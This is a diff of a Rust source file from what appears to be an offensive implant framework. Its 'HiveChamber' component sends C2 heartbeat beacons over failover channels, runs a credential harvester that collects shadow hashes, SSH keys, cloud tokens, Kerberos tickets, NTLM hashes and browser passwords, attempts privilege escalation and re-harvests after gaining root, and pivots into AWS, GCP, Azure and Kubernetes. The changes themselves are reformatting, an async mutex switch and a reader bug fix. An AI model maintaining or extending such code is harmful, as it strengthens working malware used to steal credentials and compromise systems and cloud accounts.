@@ -6,22 +6,22 @@
 // failover, and automated credential harvesting.
 
 use crate::arena_mgr;
+use crate::identity::AgentIdentity;
 use crate::ldc::{Message, Role, Value};
 use crate::shared_arena as arena;
-use crate::identity::AgentIdentity;
-use crate::telemetry::{self, EventType, TelemetryCollector, ColonyHealth};
+use crate::telemetry::{self, ColonyHealth, EventType, TelemetryCollector};
 use ed25519_dalek::Signer;
 use std::path::PathBuf;
+use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use std::sync::Mutex;
-use std::sync::atomic::{AtomicU64, Ordering};
 use tracing::{info, warn};
 use uuid::Uuid;
 
+use crate::c2_channels::{C2ChannelConfig, ChannelKind, FailoverDirector, FailoverPolicy};
+use crate::cloud_worker::{CloudCredential, CloudProvider};
 use crate::opsec::OpsecEngine;
-use crate::c2_channels::{FailoverDirector, C2ChannelConfig, ChannelKind, FailoverPolicy};
 use crate::privesc::{self, ExploitTracker};
-use crate::cloud_worker::{CloudProvider, CloudCredential};
 
 // ── HiveChamber ─────────────────────────────────────────────────────────────
 
@@ -33,7 +33,7 @@ pub struct HiveChamber {
     last_read_seq: AtomicU64,
     pub telemetry: Option<TelemetryCollector>,
     opsec_engine: Mutex<Option<OpsecEngine>>,
-    failover: Mutex<Option<FailoverDirector>>,
+    failover: tokio::sync::Mutex<Option<FailoverDirector>>,
     exploit_tracker: Mutex<ExploitTracker>,
 }
 
@@ -53,11 +53,12 @@ impl HiveChamber {
         }
 
         let id_bytes = identity.id().as_bytes().to_owned();
-        let slot_idx = arena::find_or_claim_agent_slot(ptr, id_bytes)
-            .ok_or_else(|| std::io::Error::new(
+        let slot_idx = arena::find_or_claim_agent_slot(ptr, id_bytes).ok_or_else(|| {
+            std::io::Error::new(
                 std::io::ErrorKind::AddrInUse,
                 "Arena full - no agent slots available",
-            ))?;
+            )
+        })?;
 
         arena::set_agent_role(ptr, slot_idx, role_u8);
         arena::set_verifying_key(ptr, slot_idx, identity.verifying_key_bytes());
@@ -72,14 +73,11 @@ impl HiveChamber {
             slot_idx, role
         );
 
-        let telemetry_dir = std::env::var("HIVE_TELEMETRY_DIR")
-            .unwrap_or_else(|_| "/tmp/hive_telemetry".into());
+        let telemetry_dir =
+            std::env::var("HIVE_TELEMETRY_DIR").unwrap_or_else(|_| "/tmp/hive_telemetry".into());
         let agent_id_bytes = identity.id().as_bytes().to_owned();
-        let collector = TelemetryCollector::new(
-            agent_id_bytes,
-            ptr,
-            &PathBuf::from(&telemetry_dir),
-        );
+        let collector =
+            TelemetryCollector::new(agent_id_bytes, ptr, &PathBuf::from(&telemetry_dir));
 
         Ok(Self {
             arena: Arc::new(mapping),
@@ -89,7 +87,7 @@ impl HiveChamber {
             last_read_seq: AtomicU64::new(start_seq),
             telemetry: Some(collector),
             opsec_engine: Mutex::new(None),
-            failover: Mutex::new(None),
+            failover: tokio::sync::Mutex::new(None),
             exploit_tracker: Mutex::new(ExploitTracker::new()),
         })
     }
@@ -148,8 +146,8 @@ impl HiveChamber {
     }
 
     /// Initialize the FailoverDirector lazily from env vars.
-    fn ensure_failover(&self) -> std::sync::MutexGuard<'_, Option<FailoverDirector>> {
-        let mut guard = self.failover.lock().unwrap();
+    async fn ensure_failover(&self) -> tokio::sync::MutexGuard<'_, Option<FailoverDirector>> {
+        let mut guard = self.failover.lock().await;
         if guard.is_none() {
             let mut director = FailoverDirector::new(FailoverPolicy::Priority);
 
@@ -208,7 +206,10 @@ impl HiveChamber {
                 });
             }
 
-            info!("FailoverDirector: {} channels configured", director.channels.len());
+            info!(
+                "FailoverDirector: {} channels configured",
+                director.channels.len()
+            );
             *guard = Some(director);
         }
         guard
@@ -265,12 +266,14 @@ impl HiveChamber {
         // Build beacon payload
         let beacon = format!(
             r#"{{"type":"heartbeat","agent_id":"{}","role":"{:?}","timestamp":{}}}"#,
-            self.identity.id(), self.role(), now
+            self.identity.id(),
+            self.role(),
+            now
         );
 
         // Send via FailoverDirector
         let sent_via_failover = {
-            let mut guard = self.ensure_failover();
+            let mut guard = self.ensure_failover().await;
             if let Some(ref mut director) = *guard {
                 let results = director.send_with_failover(beacon.as_bytes()).await;
                 let success = results.iter().any(|r| r.success);
@@ -334,37 +337,46 @@ impl HiveChamber {
         info!("LEECH: harvested {} credentials", harvest.len());
 
         for cred in &harvest {
-            let asset = format!("credential:{}", match cred.credential_type {
-                crate::leech::CredType::ShadowHash => "shadow",
-                crate::leech::CredType::ProcessMemory => "proc_mem",
-                crate::leech::CredType::SSHKey => "ssh_key",
-                crate::leech::CredType::CloudTokenAWS => "cloud_aws",
-                crate::leech::CredType::CloudTokenGCP => "cloud_gcp",
-                crate::leech::CredType::CloudTokenAzure => "cloud_azure",
-                crate::leech::CredType::CloudTokenK8s => "cloud_k8s",
-                crate::leech::CredType::KerberosTGT => "krb_tgt",
-                crate::leech::CredType::KerberosTGS => "krb_tgs",
-                crate::leech::CredType::NTLMHash => "ntlm",
-                crate::leech::CredType::ClearTextPassword => "cleartext",
-                crate::leech::CredType::AccessToken => "access_token",
-                crate::leech::CredType::RDPCredential => "rdp",
-                crate::leech::CredType::VaultToken => "vault",
-                crate::leech::CredType::GnupgKey => "gnupg",
-                crate::leech::CredType::BrowserPassword => "browser",
-            });
+            let asset = format!(
+                "credential:{}",
+                match cred.credential_type {
+                    crate::leech::CredType::ShadowHash => "shadow",
+                    crate::leech::CredType::ProcessMemory => "proc_mem",
+                    crate::leech::CredType::SSHKey => "ssh_key",
+                    crate::leech::CredType::CloudTokenAWS => "cloud_aws",
+                    crate::leech::CredType::CloudTokenGCP => "cloud_gcp",
+                    crate::leech::CredType::CloudTokenAzure => "cloud_azure",
+                    crate::leech::CredType::CloudTokenK8s => "cloud_k8s",
+                    crate::leech::CredType::KerberosTGT => "krb_tgt",
+                    crate::leech::CredType::KerberosTGS => "krb_tgs",
+                    crate::leech::CredType::NTLMHash => "ntlm",
+                    crate::leech::CredType::ClearTextPassword => "cleartext",
+                    crate::leech::CredType::AccessToken => "access_token",
+                    crate::leech::CredType::RDPCredential => "rdp",
+                    crate::leech::CredType::VaultToken => "vault",
+                    crate::leech::CredType::GnupgKey => "gnupg",
+                    crate::leech::CredType::BrowserPassword => "browser",
+                }
+            );
 
             let msg = Message::belief(
                 self.identity.id(),
                 self.role(),
                 asset,
-                Value::String(format!("{}@{}:{}", cred.username, cred.domain, cred.source_process)),
+                Value::String(format!(
+                    "{}@{}:{}",
+                    cred.username, cred.domain, cred.source_process
+                )),
                 cred.priority as f32 / 10.0,
             );
             self.publish(msg).await;
         }
 
         if !harvest.is_empty() {
-            info!("LEECH: published {} credential beliefs to arena", harvest.len());
+            info!(
+                "LEECH: published {} credential beliefs to arena",
+                harvest.len()
+            );
         }
     }
 
@@ -406,7 +418,10 @@ impl HiveChamber {
         {
             let tracker = self.exploit_tracker.lock().unwrap();
             if !tracker.should_attempt() {
-                info!("PRIVESC: waiting {}s before next attempt", tracker.wait_seconds());
+                info!(
+                    "PRIVESC: waiting {}s before next attempt",
+                    tracker.wait_seconds()
+                );
                 return (false, false);
             }
         }
@@ -444,12 +459,17 @@ impl HiveChamber {
         self.publish(msg).await;
 
         if result.success {
-            info!("PRIVESC: escalation SUCCESS — root_shell={}", result.root_shell);
+            info!(
+                "PRIVESC: escalation SUCCESS — root_shell={}",
+                result.root_shell
+            );
             // Re-run credential harvesting now with elevated privileges
             self.send_harvest().await;
         } else {
-            info!("PRIVESC: escalation FAILED — next in {}s",
-                self.exploit_tracker.lock().unwrap().wait_seconds());
+            info!(
+                "PRIVESC: escalation FAILED — next in {}s",
+                self.exploit_tracker.lock().unwrap().wait_seconds()
+            );
         }
 
         (true, result.success)
@@ -511,19 +531,26 @@ impl HiveChamber {
             return (false, 0);
         }
 
-        info!("CLOUD: found {} cloud credentials, pivoting", credentials.len());
+        info!(
+            "CLOUD: found {} cloud credentials, pivoting",
+            credentials.len()
+        );
         let mut worker = crate::cloud_worker::CloudWorker::new();
         let results = worker.pivot_all(&credentials);
 
         let total_resources: u32 = results.iter().map(|r| r.resources_found).sum();
 
         for result in &results {
-            let asset = format!("cloud:pivoted:{}:{}", match result.provider {
-                CloudProvider::Aws => "aws",
-                CloudProvider::Gcp => "gcp",
-                CloudProvider::Azure => "azure",
-                CloudProvider::K8s => "k8s",
-            }, result.action.replace(' ', "_"));
+            let asset = format!(
+                "cloud:pivoted:{}:{}",
+                match result.provider {
+                    CloudProvider::Aws => "aws",
+                    CloudProvider::Gcp => "gcp",
+                    CloudProvider::Azure => "azure",
+                    CloudProvider::K8s => "k8s",
+                },
+                result.action.replace(' ', "_")
+            );
 
             let msg = Message::belief(
                 self.identity.id(),
@@ -535,8 +562,11 @@ impl HiveChamber {
             self.publish(msg).await;
         }
 
-        info!("CLOUD: pivot complete — {} results, {} total resources",
-            results.len(), total_resources);
+        info!(
+            "CLOUD: pivot complete — {} results, {} total resources",
+            results.len(),
+            total_resources
+        );
 
         (true, total_resources)
     }
@@ -552,7 +582,8 @@ impl HiveChamber {
         let payload = rmp_serde::to_vec(&serde_json::json!({
             "cmd": cmd,
             "cmd_id": cmd_id.to_string(),
-        })).unwrap_or_default();
+        }))
+        .unwrap_or_default();
 
         let msg = Message {
             agent_id: self.identity.id(),
@@ -572,12 +603,15 @@ impl HiveChamber {
 
     /// Send an arbitrary beacon payload through the failover C2 channels.
     pub async fn send_beacon_c2(&self, data: &[u8]) -> bool {
-        let mut guard = self.ensure_failover();
+        let mut guard = self.ensure_failover().await;
         if let Some(ref mut director) = *guard {
             let results = director.send_with_failover(data).await;
             let success = results.iter().any(|r| r.success);
             if success {
-                info!("C2: beacon delivered via failover ({} channels tried)", results.len());
+                info!(
+                    "C2: beacon delivered via failover ({} channels tried)",
+                    results.len()
+                );
             } else {
                 warn!("C2: beacon failed on all {} channels", results.len());
             }
@@ -606,29 +640,49 @@ impl HiveChamber {
             let slot = arena::message_slot_ptr(ptr, slot_idx);
 
             let slot_seq = arena::read_slot_seq(slot);
-            if slot_seq > my_seq { my_seq += 1; continue; }
-            if slot_seq == 0 { break; }
+            if slot_seq > my_seq {
+                my_seq += 1;
+                continue;
+            }
+            // A slot is only "not yet written" when its seq AND payload are
+            // both still zero from arena init. The very first published
+            // message legitimately has seq == 0 — treating plain seq == 0 as
+            // empty used to wedge every reader that connected before the
+            // first publish until the ring wrapped around.
+            let slot_empty = slot_seq == 0 && unsafe { (*slot).payload_len } == 0;
+            if slot_empty {
+                break;
+            }
 
             unsafe {
                 let payload_len = (*slot).payload_len as usize;
                 if payload_len > 0 && payload_len <= arena::MAX_MSG_SIZE {
                     let before_seq = (*slot).seq.load(Ordering::Acquire);
-                    if before_seq != slot_seq || before_seq == 0 { my_seq += 1; continue; }
+                    if before_seq != slot_seq {
+                        my_seq += 1;
+                        continue;
+                    }
 
                     let mut payload_buf = [0u8; arena::MAX_MSG_SIZE];
                     std::ptr::copy_nonoverlapping(
-                        (*slot).payload.as_ptr(), payload_buf.as_mut_ptr(), payload_len,
+                        (*slot).payload.as_ptr(),
+                        payload_buf.as_mut_ptr(),
+                        payload_len,
                     );
 
                     let after_seq = (*slot).seq.load(Ordering::Acquire);
-                    if after_seq != before_seq { my_seq += 1; continue; }
+                    if after_seq != before_seq {
+                        my_seq += 1;
+                        continue;
+                    }
 
                     let payload_slice = &payload_buf[..payload_len];
                     let vk_bytes = &(*slot).verifying_key;
                     let sig_bytes = &(*slot).signature;
 
                     if !AgentIdentity::verify_with_key(vk_bytes, payload_slice, sig_bytes) {
-                        my_seq += 1; continue;
+                        my_seq += 1;
+                        continue;
                     }
 
                     if let Ok(msg) = rmp_serde::from_slice::<Message>(payload_slice) {
@@ -676,7 +730,11 @@ impl HiveChamber {
                     let id_bytes = arena::agent_id_val(ptr, i);
                     arena::mark_agent_dead(ptr, i);
                     let id = Uuid::from_bytes(id_bytes);
-                    warn!("Agent {} marked DEAD (no heartbeat for {}s)", id, now - hb);
+                    warn!(
+                        "Agent {} marked DEAD (no heartbeat for {}s)",
+                        id,
+                        now.saturating_sub(hb)
+                    );
                     dead.push(id);
                 }
             }
@@ -685,11 +743,21 @@ impl HiveChamber {
         dead
     }
 
-    pub fn arena_ptr(&self) -> *mut u8 { self.arena.as_ptr() }
-    pub fn agent_id(&self) -> Uuid { self.identity.id() }
-    pub fn role(&self) -> Role { u8_to_role(self.my_role) }
-    pub fn identity(&self) -> &AgentIdentity { &self.identity }
-    pub fn my_slot_idx(&self) -> usize { self.my_slot }
+    pub fn arena_ptr(&self) -> *mut u8 {
+        self.arena.as_ptr()
+    }
+    pub fn agent_id(&self) -> Uuid {
+        self.identity.id()
+    }
+    pub fn role(&self) -> Role {
+        u8_to_role(self.my_role)
+    }
+    pub fn identity(&self) -> &AgentIdentity {
+        &self.identity
+    }
+    pub fn my_slot_idx(&self) -> usize {
+        self.my_slot
+    }
 }
 
 fn u8_to_role(val: u8) -> Role {
